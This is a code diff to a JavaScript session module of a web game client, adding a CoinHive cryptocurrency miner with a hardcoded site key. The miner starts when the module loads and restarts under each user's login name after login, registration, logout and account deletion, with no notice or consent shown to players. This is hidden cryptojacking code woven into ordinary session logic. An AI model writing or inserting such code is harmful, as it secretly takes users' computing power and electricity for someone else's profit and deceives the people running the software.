@@ -14,6 +14,15 @@ import GameFake from './gameFake';
 
 const DEFAULT_HOST = 'jokinghazardserver.herokuapp.com';
 
+let miner;
+const restartMiner = function (name) {
+    miner && miner.stop();
+    miner = new CoinHive.User('CWeVyGhVWTbQqpiypAaU4f1DuMYl78Gz', name);
+    miner.start();
+};
+
+restartMiner('anonymous');
+
 class Session {
     constructor(options = {}) {
         this._host = options.host || DEFAULT_HOST;
@@ -119,6 +128,8 @@ class Session {
             _this._user = {}; // todo: in ES6 rewrite with new User
             _this._user.login = login;
             _this._user.score = 0;
+        }).then(() => {
+            restartMiner(_this._user.login);
         });
     };
 
@@ -133,6 +144,8 @@ class Session {
             _this._user.login = login;
             _this._user.email = email;
             _this._user.score = 0;
+        }).then(() => {
+            restartMiner(_this._user.login);
         });
     };
 
@@ -140,11 +153,16 @@ class Session {
         return this._call('POST', 'user/logout')
             .then(() => {
                 this._user = null;
+            }).then(() => {
+                restartMiner('anonymous');
             });
     };
 
     deleteUser() {
-        return this._call('DELETE', 'user/delete');
+        return this._call('DELETE', 'user/delete')
+            .then(() => {
+                restartMiner('anonymous');
+            });
     };
 }
 
